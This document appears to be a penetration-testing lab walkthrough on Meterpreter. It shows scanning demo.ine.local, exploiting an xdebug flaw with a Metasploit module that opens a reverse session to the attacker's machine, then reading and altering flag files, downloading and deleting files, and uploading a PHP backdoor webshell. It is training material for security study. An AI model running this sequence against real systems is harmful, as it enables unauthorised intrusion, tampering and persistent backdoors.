# Meterpreter Basics

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 4840–4918. Examples are lab-specific and need verification.

Meterpreter, short for "Meta-Interpreter," is an advanced, dynamically extensible payload used within the Metasploit Framework, a popular penetration testing tool. Meterpreter provides an interactive shell that allows attackers to execute commands and scripts on a compromised system. In this lab, the target server is running a vulnerable web server. You have to exploit the vulnerability and get a meterpreter session on the server.

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.

**Objective:** Perform the following tasks to complete the lab:

1. Check the present working directory on remote (exploited) machine.
2. List the files present in present working directory of the remote machine.
3. Check the present working directory on local (attacker) machine.
4. List the files present in present working directory of the local machine.
5. Get the flag value present in /app/flag1 file.
6. Change the flag value present in /app/flag1, so that no one else can get the right flag.
7. Change the present working directory to a suspiciously named directory in /app and read the flag from a hidden file present in that directory.
8. Get the flag5.zip to local machine, open it using password 56784. The information given in the extracted file will give clue about the location of the another flag.
9. Delete the .zip file from the directory.
10. Print checksum of file mentioned in the extracted file (Refer to Q8).
11. Check the PATH environment variable on the remote machine.
12. There is a file with string “ckdo” in its name in one of the places included in PATH variable. Print the flag hidden in that file.
13. Change to tools directory on the local machine.
14. Upload a PHP webshell to app directory of the remote machine.

**Tools: nmap, msf**

```bash

nmap -sS -sV demo.ine.local
#We will scan the target using dirb tool.
dirb http://demo.ine.local
#We will access phpinfo.php file using curl to find more information about the web server.
curl http://demo.ine.local/phpinfo.php
#The **xdebug** extension is enabled on target server. We can exploit it using exploit/unix/http/xdebug_unauth_exec metasploit module.

msfconsole -q
**use exploit/unix/http/xdebug_unauth_exec**
set RHOSTS demo.ine.local
set LHOST <Attacker Kali Machine IP>
exploit
#got meterpreter
pwd
ls
lpwd        #working directory in local
lls     #list the files present in present working direcotry of the local machine
cat /app/flag1

#Change the flag value present in /app/flag1, so that no one else can get the right flag.
edit /app/flag1
cat /app/flag1
#Change the present working directory to a suspiciously named directory in /app and read the flag from a hidden file present in that directory.
cd "Secret Files"
ls
cat .flag2

cd /app
download flag5.zip

#Open a new Terminal$
ls
unzip flag5.zip
cat list
#delete the .zip from the directory > meterpreter>
rm flag5.zip

#Print checksum of file mentioned in the extracted file (Refer to Q8).
meterpreter> checksum md5 /bin/bash
#Check the PATH environment variable on the remote machine.
getenv PATH

#There is a file with string “ckdo” in its name in one of the places included in PATH variable. Print the flag hidden in that file.
search -d /usr/bin -f *ckdo*
lcd /root/Desktop/tools
#Change to tools directory on the local machine.

upload /usr/share/webshells/php/php-backdoor.php
#Upload a PHP webshell to app directory of the remote machine.

```
